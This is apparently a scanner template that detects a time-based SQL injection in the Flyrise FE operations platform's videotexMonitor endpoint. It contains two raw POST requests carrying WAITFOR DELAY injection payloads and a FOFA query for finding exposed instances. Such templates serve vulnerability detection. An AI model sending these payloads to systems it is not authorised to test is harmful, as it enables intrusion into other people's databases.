id: poc-yaml-flyrise-videotexmonitor-sqli
info:
  name: "飞企互联-FE企业运营管理平台 videotexMonitor SQL 注入漏洞"
  author: ProjectDiscoveryAI
  severity: high
  tags: 飞企互联-FE企业运营管理平台
  metadata:
    finger: 企业运营管理平台
    fofa-query: app="飞企互联-FE企业运营管理平台"
http:
  - raw:
      - |
        POST /cooperate/videotexMonitor.js%70 HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        master_key=1&flowcode=1';WAITFOR+DELAY '0:0:5'--&dialogid=1
      - |
        POST /cooperate/videotexMonitor.js%70 HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        master_key=1&flowcode=1';WAITFOR+DELAY '0:0:8'--&dialogid=1
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "子任务信息"
          - "环节名称"
          - "办理用户"
      - type: dsl
        dsl:
          - 'duration_1>=5 && duration_1<=6'
          - 'duration_2 - duration_1 >2'
        condition: and

